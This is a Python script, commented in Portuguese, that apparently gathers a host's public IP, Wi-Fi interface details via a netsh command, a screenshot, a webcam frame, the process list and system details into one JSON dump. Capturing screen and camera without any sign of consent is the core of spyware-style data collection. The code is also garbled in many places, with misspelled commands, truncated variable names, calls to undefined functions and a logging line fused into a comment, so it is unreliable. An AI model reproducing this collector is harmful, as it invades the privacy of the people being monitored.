import os
import json
import datetime
import base64
import io
import platform
import subprocess
import logging

# Bibliotecas externas
import cv2
import numpy as np
import pyautogui
import psutil
import requests

# Configuração de logs para evitar print excessivologging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def coletar_ip():
    """Obtém o IP público de forma multiplataforma."""
    try:
        # Utiliza a API do ipify que é gratuita e confiável        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text
    except Exception as e:
        logger.error(f"Erro ao coletar IP: {e}")
        return None

def coletar_wifi():
"""Captura informações de WiFi (Apenas Windows)."""
    if platform.system() != "Windows":
        logger.warning("Coleta de WiFi via netsh disponível apenas no Windows.")
        return None
    try:
        result = subprocess.check_output("netshlan show interfaces", shell=True).decode('utf-8', errors='ignore')
        return result
    except Exception as e:
        logger.error(f"Erro ao coletar WiFi: {e}")
        return None

def capturar_tela():
    """Capt a tela e converte para base64."""
    try:
        screenshot = pyautogui.screenshot()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        return base64.b64encode(_byte_arr.getvalue()).decode('utf-8')
    except Exception as e:
        logger.error(f"Erro ao capturar tela: {e}")
        return None

def capturar_camera():
    """Captura um frame da webcam e converte para64."""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            _, buffer =2.imencode('.jpg', frame)
            return base64.b64encode(buffer).decode('utf-8')
    except Exception as e:
        logger.error(f"Erro ao acessar câmera: {e}")
    return None

def coletar_process():
    """Lista processos ativos de forma segura."""
    try:
        processos = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            # .info retorna um dict com as chaves solicitadas
            processos.appendproc.info)
        return processos
    except Exception as e:
        logger.error(f"Erro ao coletar processos: {e}")
        return None

def coletar_informacoes():
    """Agrega todas as informações em um dicionário."""
    return {        "timestamp": datetime.datetime.now().isoformat(),
        "ip": coletar_ip(),
        "wifi": coletar_wifi(),
        "tela": capturar_tela(),
        "camera": capturar_camera(),
        "processos": coletar_os(),
        "plataforma": platform.system(),
        "versao": platform.version(),
        "maquina": platform.machine(),
        "processador": platform.processor()
    }

if __name__ == "__main__":
    dados = coletarinformacoes()
    print(json.dumps(dados, indent=2))
